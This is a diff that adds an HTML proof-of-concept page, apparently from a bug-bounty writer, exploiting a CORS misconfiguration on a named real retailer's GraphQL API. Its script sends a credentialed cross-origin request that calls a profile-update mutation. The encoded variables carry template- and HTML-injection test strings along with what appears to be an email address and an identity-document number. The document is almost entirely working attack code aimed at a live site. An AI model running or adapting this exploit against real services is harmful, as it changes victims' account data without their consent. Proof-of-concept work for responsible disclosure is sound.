@@ -1,0 +1,23 @@
+<html>
+<body>
+<center>
+<h2>POST Based CORS POC Exploit By bugDestroyers</h2>
+<h3>Exploit!</h3>
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = alert(this.responseText);
+    }
+  };
+  xhttp.open("POST", "https://www.walmart.com.ar/api/io/_v/private/graphql/v1?workspace=master&maxAge=long&appsEtag=7e9ae5a54dcffcdc19fd6b187a4a90dc5736d272&domain=store&locale=es-AR", true);
+  xhttp.withCredentials = true;
+  xhttp.send('{"operationName":"UpdateProfile","variables":{},"extensions":{"persistedQuery":{"version":"vtex.my-account@0.31.2","sha256Hash":"54e5ce81c03346fd27e8a34dfe0dd7d47f6144333a803e1309c167f414f2ea43"},"variables":"eyJwcm9maWxlIjp7ImZpcnN0TmFtZSI6Int7NSo1fX08aDE+dGVzdDwvaDE+IiwibGFzdE5hbWUiOiJ7ezUqNn19PGgxPnRlc3Q8L2gxPiIsImVtYWlsIjoibW9zb20xMzMzN0BnbWFpbC5jb20iLCJkb2N1bWVudCI6IjMwMDY1MDgiLCJob21lUGhvbmUiOiIiLCJnZW5kZXIiOiJtYWxlIiwiYmlydGhEYXRlIjpudWxsLCJjb3Jwb3JhdGVOYW1lIjpudWxsLCJ0cmFkZU5hbWUiOm51bGwsImNvcnBvcmF0ZURvY3VtZW50IjpudWxsLCJidXNpbmVzc1Bob25lIjpudWxsLCJpc0NvcnBvcmF0ZSI6ZmFsc2V9fQ=="}}');
+}
+</script>
+</body>
+</html>
